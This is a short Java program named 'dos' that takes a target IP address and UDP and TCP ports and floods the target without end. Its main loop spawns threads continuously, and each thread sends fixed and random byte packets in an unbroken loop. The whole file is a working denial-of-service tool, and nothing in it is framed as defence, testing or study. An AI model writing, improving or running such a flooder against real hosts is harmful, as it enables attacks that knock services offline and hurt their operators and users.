import java.net.*;
import java.util.Random;

public class dos {
    public static void main(String[] args) {
        if (args.length < 3) {
            System.out.println("Usage: java dos ip udpport tcpport");
            return;
        }
        
        String ip = args[0];
        int udpport = Integer.parseInt(args[1]);
        int tcpport = Integer.parseInt(args[2]);
        
        byte[] hexarray = new byte[]{
            0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
            16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
            32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,
            48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63,
            64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79,
            80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95,
            96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111,
            112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127,
            -128, -127, -126, -125, -124, -123, -122, -121, -120, -119, -118, -117, -116, -115, -114, -113,
            -112, -111, -110, -109, -108, -107, -106, -105, -104, -103, -102, -101, -100, -99, -98, -97,
            -96, -95, -94, -93, -92, -91, -90, -89, -88, -87, -86, -85, -84, -83, -82, -81,
            -80, -79, -78, -77, -76, -75, -74, -73, -72, -71, -70, -69, -68, -67, -66, -65,
            -64, -63, -62, -61, -60, -59, -58, -57, -56, -55, -54, -53, -52, -51, -50, -49,
            -48, -47, -46, -45, -44, -43, -42, -41, -40, -39, -38, -37, -36, -35, -34, -33,
            -32, -31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17,
            -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0
        };
        String hexString = "48656C6C6F";
        byte[] b1 = new byte[]{ 0x08, 0x1e, 0x77, (byte) 0xda };
        byte[] b2 = hexString.getBytes();
        byte[] b3 = new byte[0];
        new Random().nextBytes(b3);
        new Random().nextBytes(hexarray);

        while (true) {
            Thread thread = new Thread(() -> UDP(ip, udpport, b1, b2, b3, hexarray));
            Thread thread2 = new Thread(() -> TCP(ip, tcpport, b1, b2, b3, hexarray));
            thread.setDaemon(true);
            thread2.setDaemon(true);
            thread.start();
            thread2.start();
        }
    }
    
    public static void UDP(String ip, int udpport, byte[] b1, byte[] b2, byte[] b3, byte[] hexarray) {
        try {
            DatagramSocket s = new DatagramSocket();
            s.setReuseAddress(true);
            s.setBroadcast(true);
            s.setSendBufferSize(65507);
            InetAddress address = InetAddress.getByName(ip);
            DatagramPacket packet1 = new DatagramPacket(b1, b1.length, address, udpport);
            DatagramPacket packet2 = new DatagramPacket(b2, b2.length, address, udpport);
            DatagramPacket packet3 = new DatagramPacket(b3, b3.length, address, udpport);
            DatagramPacket packet4 = new DatagramPacket(hexarray, hexarray.length, address, udpport);
            while (true) {
                s.send(packet1);
                s.send(packet2);
                s.send(packet3);
                s.send(packet4);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void TCP(String ip, int tcpport, byte[] b1, byte[] b2, byte[] b3, byte[] hexarray) {
        try {
            Socket s = new Socket();
            s.setTcpNoDelay(true);
            s.setSendBufferSize(65507);
            s.setKeepAlive(true);
            InetAddress address = InetAddress.getByName(ip);
            InetSocketAddress target = new InetSocketAddress(address, tcpport);
            s.connect(target);
            while (true) {
                s.getOutputStream().write(b1);
                s.getOutputStream().write(b2);
                s.getOutputStream().write(b3);
                s.getOutputStream().write(hexarray);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
